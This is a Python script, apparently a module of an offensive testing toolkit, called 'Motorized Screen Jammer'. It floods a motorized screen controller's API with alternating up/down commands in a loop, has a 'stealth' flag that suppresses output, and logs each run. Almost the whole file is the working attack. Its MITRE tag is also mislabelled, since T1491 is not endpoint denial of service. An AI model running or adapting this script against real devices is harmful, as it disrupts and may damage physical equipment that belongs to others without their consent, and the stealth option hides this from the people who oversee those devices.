# modules/exploits/motor_screen_jammer.py

import argparse
import time
import json
import os
from datetime import datetime
import requests

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1491"  # Endpoint Denial of Service

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    data = []
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def jam_screen(endpoint, cycles, delay, stealth):
    try:
        for i in range(cycles):
            for cmd in ["up", "down"]:
                r = requests.post(endpoint, json={"command": cmd}, timeout=3)
                if not stealth:
                    print(f"[+] {cmd.upper()} command sent ({i+1}/{cycles})")
                time.sleep(delay)
        log_event({
            "timestamp": datetime.utcnow().isoformat(),
            "endpoint": endpoint,
            "action": "jam_loop",
            "cycles": cycles,
            "ttp": MITRE_TTP
        })
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Motorized Screen Jammer")
    parser.add_argument("--endpoint", required=True, help="API endpoint of screen controller")
    parser.add_argument("--cycles", type=int, default=5, help="Number of up/down cycles")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between commands (sec)")
    parser.add_argument("--stealth", action="store_true", help="Suppress output")
    args = parser.parse_args()

    jam_screen(args.endpoint, args.cycles, args.delay, args.stealth)
